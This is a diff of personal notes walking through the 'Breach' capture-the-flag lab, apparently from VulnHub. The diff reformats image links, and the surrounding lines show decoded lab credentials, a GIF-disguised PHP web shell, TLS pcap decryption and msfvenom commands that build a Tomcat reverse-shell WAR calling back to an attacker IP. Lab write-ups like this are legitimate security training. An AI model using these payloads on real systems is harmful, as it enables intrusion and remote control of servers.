@@ -189,15 +189,15 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 - Not too much from the breach.html, a image says should look into source code, and a button click would lead to index.html.
 - Then we finally have something from index.html source page
-![[Pasted image 20210422125708.png]]
+![Pasted image 20210422125708.png](Pasted%20image%2020210422125708.png)
 ```bash
 echo 'Y0dkcFltSnZibk02WkdGdGJtbDBabVZsYkNSbmIyOWtkRzlpWldGbllXNW5KSFJo' | base64 -d | base64 -d
 pgibbons:damnitfeel$goodtobeagang$ta
 ```
 - Is that a credential pair? initech.html is not showing from the pages scanning.
-![[Pasted image 20210422130020.png]]
+![Pasted image 20210422130020.png](Pasted%20image%2020210422130020.png)
 - This page looks like company entry, and from source code, we can see there's mailbox and user.php.
-![[Pasted image 20210422130258.png]]
+![Pasted image 20210422130258.png](Pasted%20image%2020210422130258.png)
 - Hostname: [breach.local](mailto:webmaster@breach.local)
 - Possible name:  Samir Nagheenanajar
 
@@ -254,8 +254,8 @@ Connection closed by foreign host.
 ```
 
 - Google the info get one software named portspoof
-![[Pasted image 20210422124449.png]]
-![[Pasted image 20210422124655.png]]
+![Pasted image 20210422124449.png](Pasted%20image%2020210422124449.png)
+![Pasted image 20210422124655.png](Pasted%20image@2020210422124655.png)
 - This is exactly the one cause our problem.
 
 # CMS
@@ -331,9 +331,9 @@ evil.gif: GIF image data, version 89a, 2619 x 16188
 GIF89a;
 <?php system($_GET["cmd"]); ?>
 ```
-![[Pasted image 20210422153523.png]]
+![Pasted image 20210422153523.png](Pasted%20image%2020210422153523.png)
 - Nothing anymore around, but by clicking around, found that the content menu can be expanded
-![[Pasted image 20210422155247.png]]
+![Pasted image 20210422155247.png](Pasted%20image%2020210422155247.png)
 - Then there's a post:
 	- http://192.168.110.140/impresscms/\_SSL\_test\_phase1.pcap
 	- They told me the alias, storepassword and keypassword are all set to 'tomcat'. 
@@ -399,15 +399,15 @@ pHiPhbocjixKJz9xx+pG0jDkrg==
 ```
 
 - But even have no this key, we can still get from the pcap that our victim host is using port 8443 to talk to another PC box.
-![[Pasted image 20210422162703.png]]
+![Pasted image 20210422162703.png](Pasted%20image%2020210422162703.png)
 
 ## Wireshark
 - New things to learn, put rsa key into wireshark
-![[Pasted image 20210422170920.png]]
+![Pasted image 20210422170920.png](Pasted%20image%2020210422170920.png)
 - Then we will see TLS menu item from Follow menu, then we can see the decrypted content
-![[Pasted image 20210422171551.png]]
+![Pasted image 20210422171551.png](Pasted%20image%2020210422171551.png)
 - And there's one more base64 code
-![[Pasted image 20210422172346.png]]
+![Pasted image 20210422172346.png](Pasted%20image%2020210422172346.png)
 ```bash
 echo 'dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC' | base64 -d
 tomcat:Tt\5D8F(#!*u=G)4m7zB
@@ -417,12 +417,12 @@ tomcat:Tt\5D8F(#!*u=G)4m7zB
 # HTTPS_M@nag3Me
 ## Firefox trouble
 - I've got an access trouble from my firefox to this url: https://192.168.110.140:8443/_M@nag3Me/html
-![[Pasted image 20210423111653.png]]
+![Pasted image 20210423111653.png](Pasted%20image%2020210423111653.png)
 - And tried all fixing steps from online, none of them work, then one page said it could be incompatible from old tls website with new web browser, which can be solved by use proxy
 - Which is BurpSuite coming; Always use Burp as Intercepter, new trick learnt, set browser proxy to Burp, and then turn off the intercept, then Burp will work as transparent proxy.
 - Then this url is accessible, and we will get an login prompt, and we can use the credential get from the pcap [[20 - ImpressCMS]]
-![[Pasted image 20210423112910.png]]
-![[Pasted image 20210423112937.png]]
+![Pasted image 20210423112910.png](Pasted%20image%2020210423112910.png)
+![Pasted image 20210423112937.png](Pasted%20image%2020210423112937.png)
 
 ## WAR upload
 - Try to make a malicious WAR which can be deploy in tomcat to get reverse shell
@@ -436,7 +436,7 @@ Final size of war file: 1550 bytes
 Saved as: pwn.war
 ```
 - But after select the file and click deploy, I've got permission denied
-![[Pasted image 20210423120353.png]]
+![Pasted image 20210423120353.png](Pasted%20image%2020210423120353.png)
 - Alright the reason is that tomcat use java, and I did not use the java/jsp to generate WAR
 ```bash
 msfvenom -p java/jsp_shell_reverse_tcp lhost=192.168.110.100 lport=9001 -f war -o pwn.war
@@ -444,7 +444,7 @@ Payload size: 1102 bytes
 Final size of war file: 1102 bytes
 Saved as: pwn.war
 ```
-![[Pasted image 20210423122003.png]]
+![Pasted image 20210423122003.png](Pasted%20image%2020210423122003.png)
 - Then we will have reverse shell
 
 # Privesc
